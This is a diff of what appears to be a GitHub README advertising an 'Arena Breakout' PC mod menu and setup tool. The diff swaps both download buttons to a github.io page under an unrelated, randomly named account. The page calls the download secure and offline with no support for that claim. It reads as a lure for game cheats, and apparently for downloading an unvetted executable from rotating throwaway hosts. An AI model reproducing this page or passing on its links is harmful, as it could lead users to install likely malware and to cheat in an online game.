@@ -3,8 +3,8 @@
 Unlock a smoother, more efficient Arena Breakout experience on PC. This offline utility empowers players with interface customization, FPS tuning, and quality-of-life enhancements — all delivered in a secure, user-friendly setup tool.
 
 🟢🟢  
-[![🟢 Download Setup Assistant](https://img.shields.io/badge/🟢-Download_Setup_Tool-green?style=for-the-badge)](https://arena-breakout-pc-mod-menu.github.io/.github/)  
-[![🟢 Launch Mod Menu](https://img.shields.io/badge/🟢-Launch_Mod_Menu-green?style=for-the-badge)](https://arena-breakout-pc-mod-menu.github.io/.github/)  
+[![🟢 Download Setup Assistant](https://img.shields.io/badge/🟢-Download_Setup_Tool-green?style=for-the-badge)](https://shubhanginigangwar5755awa.github.io/.github/)  
+[![🟢 Launch Mod Menu](https://img.shields.io/badge/🟢-Launch_Mod_Menu-green?style=for-the-badge)](https://shubhanginigangwar5755awa.github.io/.github/)  
 🟢🟢
 
 ---
